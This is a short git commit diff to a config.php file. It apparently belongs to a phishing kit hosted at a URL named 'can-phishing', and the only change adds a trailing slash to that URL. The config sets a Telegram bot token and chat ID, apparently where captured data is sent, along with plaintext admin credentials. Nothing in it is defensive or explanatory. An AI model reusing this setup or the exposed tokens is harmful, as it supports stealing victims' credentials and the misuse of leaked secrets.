a4b6b70e8be29e5e1f240312fed0af5472da1c71
webcyber0 <hellowebcyber@gmail.com>
2026-07-23 14:21:31 +0530

    Update config.php

--- anmol/config.php
+++ anmol/config.php
@@ -2,7 +2,7 @@
 $config = [
     'bot_token' => '8271297882:AAGhvkzMzSH4GQ-VeGmZ6_RR2h5oilx5rmg',
     'chat_id'   => '7531578236',
-    'website'   => 'https://can-phishing.onrender.com/anmol',
+    'website'   => 'https://can-phishing.onrender.com/anmol/',
     'admin_username' => 'anish',
     'admin_password' => 'exploits123'
 ];
